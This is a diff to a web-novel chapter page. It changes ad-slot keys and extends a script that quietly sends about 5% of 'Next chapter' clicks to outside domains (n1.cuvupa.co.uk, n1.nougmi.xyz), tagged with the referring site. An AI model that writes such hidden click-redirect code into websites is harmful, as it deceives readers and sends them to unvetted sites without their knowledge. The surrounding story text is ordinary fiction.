@@ -2391,31 +2391,31 @@
                 <p>&#34;Because you’re hideous.&#34;</p>
                 <p>The call ended abruptly.</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
                 <p>Sebastian was left gaping at his phone, while Evelyn, who had been listening in, burst into muffled laughter.</p>
                 <p>Is he always this ruthless with his friends? No wonder he’s made so many enemies. Then again, he probably doesn’t care.</p>
                 <p>Watching Alexander’s interactions was like witnessing a comedy sketch—except she had to stifle her amusement. She had failed earlier, letting out a soft giggle that Sebastian had definitely caught.</p>
                 <p>And since he’d called her a siren who’d bewitched Alexander, she made a mental note to pay him back later.</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
                 <p>&#34;Why are you so amused?&#34; Alexander’s voice snapped her back to reality.</p>
                 <p>She was sprawled on the couch, face buried in a throw pillow, shoulders shaking with silent laughter.</p>
                 <p>&#34;I’m fine,&#34; she lied, sitting up but failing to wipe the grin off her face.</p>
                 <p>&#34;It’s just… being your friend must be exhausting.&#34;</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
                 <p>If Alexander spoke this bluntly to someone as close as Sebastian, she could only imagine how brutal he was with mere acquaintances. The realization made her wary—this man was not to be trifled with.</p>
                 <p>&#34;Exhausting?&#34;</p>
                 <p>Alexander leaned down, caging her between his arms and the couch. His gaze was intense.</p>
                 <p>&#34;Good thing you don’t have to be my friend, then.&#34;</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
                 <p>Evelyn blinked. &#34;Oh?&#34;</p>
                 <p>His lips curved. &#34;You just have to be mine.&#34;</p>
                 <p>Her breath hitched. Where did that come from?</p>
                 <p>Before she could process it, he shifted gears. &#34;Let’s talk about Cassandra. You’re really not jealous?&#34;</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
                 <p>Evelyn groaned internally. Why is he fixated on this? Shouldn’t he be glad I trust him?</p>
                 <p>Cautiously, she tested the waters. &#34;Should I… be?&#34;</p>
                 <p>His expression darkened instantly. &#34;That’s not the right question.&#34;</p>
@@ -2425,7 +2425,7 @@
                 <p>Then she ruined it. &#34;…Was that the right answer?&#34;</p>
                 <p>Alexander stared at her, utterly speechless.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
             </div>
             
             <div class="font-controls">
@@ -2547,7 +2547,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2563,8 +2563,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
